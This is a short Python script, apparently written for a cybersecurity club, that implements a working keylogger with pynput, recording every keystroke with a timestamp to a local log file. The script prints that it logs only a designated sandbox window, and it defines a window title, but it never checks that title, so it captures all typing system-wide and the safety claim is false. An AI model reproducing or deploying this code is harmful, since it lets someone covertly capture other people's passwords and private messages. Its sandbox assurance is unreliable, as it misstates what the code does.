from pynput import keyboard
from datetime import datetime

LOG_FILE = "keystrokes.log"

allowed_window_title = "CyberSec SIG - Safe Typing Box"

def log_key(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        k = key.char
    except AttributeError:
        k = str(key)

    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp} | {k}\n")

def on_press(key):
    log_key(key)

def start_listener():
    print("Friendly Keylogger Running...")
    print("Only log keys from the designated sandbox window.")
    print("Press CTRL+C to stop.")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_listener()
